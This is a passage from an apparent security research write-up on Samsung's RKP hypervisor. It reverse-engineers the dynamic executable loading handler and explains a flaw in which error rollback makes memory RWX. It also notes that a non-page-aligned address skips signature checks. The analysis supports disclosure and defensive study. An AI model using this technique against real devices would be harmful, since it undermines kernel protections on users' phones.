<p>The kernel first fills a <code>rkp_dynamic_load_t</code> structure with the information about the binary to load. If the binary is already loaded, it unloads it by making a <code>uh_call</code> with the command <code>RKP_DYNAMIC_LOAD</code> and the subcommand <code>RKP_DYN_COMMAND_RM</code>. It then makes the memory <code>RW-</code> and copies the binary's code and data segments into it. Finally, it makes the binary code executable by making a <code>uh_call</code> with the command <code>RKP_DYNAMIC_LOAD</code> and the subcommand <code>RKP_DYN_COMMAND_INS</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// from init/main.c</span>
<span class="cp">#ifdef CONFIG_UH_RKP</span>
<span class="n">rkp_init_t</span> <span class="n">rkp_init_data</span> <span class="n">__rkp_ro</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="p">.</span><span class="n">no_fimc_verify</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="c1">// ...</span>
<span class="p">};</span>
<span class="c1">// ...</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">__init</span> <span class="n">rkp_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="n">uh_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_START</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rkp_init_data</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">kimage_voffset</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// ...</span>
<span class="cp">#endif</span>
</code></pre></div>

<p>The hypervisor will verify the binary's integrity, if it wasn't 
disabled by the kernel during initialization by setting to 1 the <code>no_fimc_verify</code> field of the <code>rkp_init_t</code> structure given to the <code>RKP_START</code> command (which was the case in some of the kernel sources we have seen).</p>
<p>Back to the hypervisor, the handler that will process the <code>RKP_DYNAMIC_LOAD</code> command and its subcommands is <code>rkp_cmd_dynamic_load</code>:</p>
<div id="rkp_cmd_dynamic_load">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_cmd_dynamic_load</span><span class="p">(</span><span class="n">saved_regs_t</span><span class="o">*</span> <span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">type</span> <span class="o">=</span> <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x2</span><span class="p">;</span>
  <span class="n">rkp_dyn</span> <span class="o">=</span> <span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span><span class="p">)</span><span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">x3</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_BREAKDOWN_BEFORE_INIT</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_breakdown_before_init</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">392</span><span class="p">,</span> <span class="s">"dynamic_breakdown_before_init failed"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_INS</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_load_ins</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">406</span><span class="p">,</span> <span class="s">"dynamic_load ins type:%d success"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_RM</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_load_rm</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">400</span><span class="p">,</span> <span class="s">"dynamic_load rm type:%d success"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">ret_va</span> <span class="o">=</span> <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x4</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ret_va</span><span class="p">)</span>
    <span class="o">*</span><span class="n">virt_to_phys_el1</span><span class="p">(</span><span class="n">ret_va</span><span class="p">)</span> <span class="o">=</span> <span class="n">res</span><span class="p">;</span>
  <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x0</span> <span class="o">=</span> <span class="n">res</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p>There is one other subcommand, <code>RKP_DYN_COMMAND_BREAKDOWN_BEFORE_INIT</code>, but it is not interesting because it can only be called before RKP is initialized.</p>
<div id="dynamic_load_ins">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_ins</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_check</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">273</span><span class="p">,</span> <span class="s">"dynamic_load_check failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mh">0xF13C0001</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_protection</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">280</span><span class="p">,</span> <span class="s">"dynamic_load_protection failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0002</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">EXIT_RW</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_verify_signing</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">288</span><span class="p">,</span> <span class="s">"dynamic_load_verify_signing failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0003</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">EXIT_RW</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_make_rox</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">295</span><span class="p">,</span> <span class="s">"dynamic_load_make_rox failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0004</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">EXIT_SET_PXN</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_add_executable</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">303</span><span class="p">,</span> <span class="s">"dynamic_load_add_executable failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0005</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">EXIT_RM_EXECUTABLE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_add_dynlist</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">309</span><span class="p">,</span> <span class="s">"dynamic_load_add_dynlist failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0006</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">EXIT_RM_DYNLIST</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="nl">EXIT_RM_DYNLIST</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rm_dynlist</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">317</span><span class="p">,</span> <span class="s">"fail to dynamic_load_rm_dynlist, later in dynamic_load_ins"</span><span class="p">);</span>
<span class="nl">EXIT_RM_EXECUTABLE</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rm_executable</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">320</span><span class="p">,</span> <span class="s">"fail to dynamic_load_rm_executable, later in dynamic_load_ins"</span><span class="p">);</span>
<span class="nl">EXIT_SET_PXN</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_set_pxn</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">323</span><span class="p">,</span> <span class="s">"fail to dynamic_load_set_pxn, later in dynamic_load_ins"</span><span class="p">);</span>
<span class="nl">EXIT_RW</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rw</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">326</span><span class="p">,</span> <span class="s">"fail to dynamic_load_rw, later in dynamic_load_ins"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p>In the nominal case, <code>dynamic_load_ins</code> calls a bunch of functions sequentially:</p>
<ul>
<li><code>dynamic_load_check</code> to validate the executable's information;</li>
<li><code>dynamic_load_protection</code> to make the code segment(s) <code>R-X</code> in the stage 2;</li>
<li><code>dynamic_load_verify_signing</code> to verify the executable's signature;</li>
<li><code>dynamic_load_make_rox</code> to make the code segments(s) <code>R-X</code> in the stage 1;</li>
<li><code>dynamic_load_add_executable</code> to add the code segments(s) to the <code>executable_regions</code>;</li>
<li><code>dynamic_load_add_dynlist</code> to add the executable to the <code>dynamic_load_regions</code> memlist.</li>
</ul>
<p>If any of these functions fail, except the <code>dynamic_load_check</code> one, the hypervisor will try to undo what it has done so far by calling some or all of these other functions:</p>
<ul>
<li><code>dynamic_load_rm_dynlist</code> to remove the executable from the <code>dynamic_load_regions</code> memlist;</li>
<li><code>dynamic_load_rm_executable</code> to remove the code segments(s) from the <code>executable_regions</code>;</li>
<li><code>dynamic_load_set_pxn</code> to make the code segment(s) <code>R--</code> in the stage 1;</li>
<li><code>dynamic_load_rw</code> to make the code segment(s) <code>RWX</code> in the stage 2.</li>
</ul>
<p>The vulnerability is once again two-fold:</p>
<ul>
<li>memory that is currently <code>R-X</code> or <code>RW-</code> in the stage 2 will be made <code>R-X</code> by <code>dynamic_load_protection</code>, but on the first error <code>dynamic_load_rw</code> will be called and will make it <code>RWX</code>, regardless of its original permissions;</li>
<li>it is possible to give read-only memory in the stage 2 to these functions because the <code>dynamic_load_check</code> function doesn't validate the executable properly.</li>
</ul>
<div id="dynamic_load_check">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_check</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_MODULE</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="n">binary_base_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">memlist_overlaps_range</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dynamic_load_regions</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="s">"dynamic_load[%p~%p] is overlapped with another"</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pgt_bitmap_overlaps_range</span><span class="p">(</span><span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'D'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="s">"dynamic_load[%p~%p] is ro"</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>dynamic_load_check</code> checks if the executable's binary 
range overlaps with any of the currently loaded executables. It also 
checks if the binary range overlaps with read-only memory in the stage 
2. Unfortunately this checking is faulty: it doesn't ensure that code 
segments are located within the binary range.</p>
<p>Please note that the call to <code>uh_log</code> that happens if <code>pgt_bitmap_overlaps_range</code> returned a non-zero value, is done with <code>'D'</code> as the first argument, meaning that <code>uh_log</code> will call <code>uh_panic</code> and the hypervisor will panic.</p>
<div id="dynamic_load_protection">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_protection</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">code_base1_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_s2_range_change_permission</span><span class="p">(</span><span class="n">code_base1_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span> <span class="o">+</span> <span class="n">code_base1_pa</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="s">"Dynamic load: fail to make first code range RO %lx, %lx"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">code_base2_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_s2_range_change_permission</span><span class="p">(</span><span class="n">code_base2_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span> <span class="o">+</span> <span class="n">code_base2_pa</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="s">"Dynamic load: fail to make second code range RO %lx, %lx"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>dynamic_load_protection</code> will make the code segment(s) <code>R-X</code> in the stage 2 by calling <code>rkp_s2_range_change_permission</code>. Only executables of type <code>RKP_DYN_FIMC_COMBINED</code> can have two code segments. To avoid <code>dynamic_load_verify_signing</code>, and to get directly to <code>dynamic_load_rw</code>, we can make the second call to <code>rkp_s2_range_change_permission</code> fail by giving it an address that is not page-aligned.</p>
<div id="dynamic_load_rw">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_rw</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">code_base1_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_s2_range_change_permission</span><span class="p">(</span><span class="n">code_base1_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span> <span class="o">+</span> <span class="n">code_base1_pa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="s">"Dynamic load: fail to make first code range RO %lx, %lx"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">code_base2_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_s2_range_change_permission</span><span class="p">(</span><span class="n">code_base2_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span> <span class="o">+</span> <span class="n">code_base2_pa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="s">"Dynamic load: fail to make second code range RO %lx, %lx"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>dynamic_load_rw</code> will make the code segment(s) <code>RWX</code> in the stage 2 by also calling <code>rkp_s2_range_change_permission</code>. If we gave an address that is not page-aligned in <code>dynamic_load_protection</code>, the second call to <code>rkp_s2_range_change_permission</code> will also fail here, but that's not an issue.</p>
<p>For reference (and to complete the Samsung RKP Compendium), you can find below the pseudo-code of all the other functions.</p>
<div id="dynamic_load_verify_signing">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_verify_signing</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">NO_FIMC_VERIFY</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="s">"FIMC Signature verification Skip"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">RKP_DYN_FIMC</span> <span class="o">&amp;&amp;</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">binary_base_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fmic_signature_verify</span><span class="p">(</span><span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="s">"FIMC Signature verification failed %lx, %lx"</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span>
           <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="s">"FIMC Signature verification Success %lx, %lx"</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_base</span><span class="p">,</span>
         <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_make_rox">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_make_rox</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_set_range_to_rox</span><span class="p">(</span><span class="n">INIT_MM_PGD</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span> <span class="o">+</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">rkp_set_range_to_rox</span><span class="p">(</span><span class="n">INIT_MM_PGD</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span> <span class="o">+</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_add_executable">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_add_executable</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">memlist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">executable_regions</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">memlist_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">executable_regions</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_add_dynlist">


